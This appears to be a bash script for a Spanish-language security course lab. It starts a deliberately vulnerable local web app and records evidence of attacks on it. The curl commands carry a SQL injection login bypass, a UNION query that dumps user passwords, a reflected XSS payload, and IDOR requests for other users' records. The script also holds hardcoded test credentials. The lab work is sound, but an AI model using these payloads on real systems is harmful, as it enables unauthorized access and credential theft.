#!/usr/bin/env bash
# Evidencias de la Actividad 2 (identificación de vulnerabilidades).
# Uso:  cd ~/Desktop/vulnerable && bash evidencias_vulns.sh
set -u
cd "$(dirname "$0")"
EV="$(pwd)/evidencias"; mkdir -p "$EV"
source .venv/bin/activate
titulo() { printf '\n==================== %s ====================\n' "$1"; }
cmd() { printf '\n$ %s\n' "$*"; eval "$@"; }

python app.py > /dev/null 2>&1 &
APP_PID=$!
for i in $(seq 1 20); do curl -s http://127.0.0.1:5050/salud | grep -q stark-portal && break; sleep 1; done

{
titulo "A2. Pruebas automatizadas de las 3 vulnerabilidades"
cmd "python exploits/demo_vulns.py"
} 2>&1 | tee "$EV/08_demo_vulns.txt"

{
titulo "A2. Pruebas manuales con curl"
J=/tmp/stark_j.txt; rm -f $J
echo; echo "# SQLi: evasión de autenticación (usuario = ana.ti' --)"
cmd "curl -s -c $J -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' --data-urlencode \"username=ana.ti' --\" --data-urlencode 'password=x' http://127.0.0.1:5050/login"
cmd "curl -s -b $J http://127.0.0.1:5050/dashboard | grep -o 'Bienvenido(a), [^<]*'"
rm -f $J
cmd "curl -s -c $J -o /dev/null -d 'username=sofia.consulta&password=Consulta*26' http://127.0.0.1:5050/login"
echo; echo "# SQLi: UNION en /buscar"
cmd "curl -s -b $J -G --data-urlencode \"q=zzz' UNION SELECT username, password, rol FROM usuarios --\" http://127.0.0.1:5050/buscar | grep -o '<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td></tr>'"
echo; echo "# XSS reflejado: el payload aparece sin escapar en el HTML"
cmd "curl -s -b $J -G --data-urlencode \"q=<script>alert('XSS-Stark')</script>\" http://127.0.0.1:5050/buscar | grep -n 'Resultados para'"
echo; echo "# IDOR/BOLA: luis.oper (id 2) pide recursos ajenos"
rm -f $J
cmd "curl -s -c $J -o /dev/null -d 'username=luis.oper&password=Turno1!2026' http://127.0.0.1:5050/login"
for id in 2 4 1; do cmd "curl -s -b $J -w '  [HTTP %{http_code}]\n' http://127.0.0.1:5050/api/ordenes/$id"; done
cmd "curl -s -b $J http://127.0.0.1:5050/perfil/4 | grep -o '<td>[^<]*@stark.example</td>'"
rm -f $J
} 2>&1 | tee "$EV/09_pruebas_curl.txt"

titulo "A2. Capturas del navegador"
python tools/capturas_vulns.py 2>&1 | tee "$EV/10_capturas_vulns.txt"

{
titulo "A2. Evidencia en los registros (logs/app.log)"
cmd "grep -E \"consulta_login=.*--|UNION|error_sql|/api/ordenes/(1|4)|/perfil/(1|4)\" logs/app.log | grep -v ' - - ' | tail -n 14"
} 2>&1 | tee "$EV/11_log_ataques.txt"

kill $APP_PID 2>/dev/null
titulo "LISTO"
ls -1 "$EV/capturas_vulns"
